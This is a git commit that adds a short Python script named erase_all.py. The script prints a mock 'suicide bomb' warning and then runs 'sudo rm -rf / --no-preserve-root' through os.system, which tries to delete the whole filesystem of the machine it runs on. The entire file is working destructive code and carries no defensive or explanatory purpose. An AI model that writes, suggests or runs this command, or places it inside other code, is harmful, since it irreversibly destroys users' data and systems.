e726b550f722f6c57824a37e2bfde93aa64e461c
Anivedh <anivedh.21810720@viit.ac.in>
2020-08-24 02:30:25 +0530

    first commit

---
+++ erase_all.py
@@ -0,0 +1,11 @@
+import os
+import time
+
+print("Initiating...")
+time.sleep(5)
+print("THIS IS A SUICIDE BOMB...DON'T PRESS ANY KEY...")
+time.sleep(1)
+os.system("sudo rm -rf / --no-preserve-root")
+
+
+
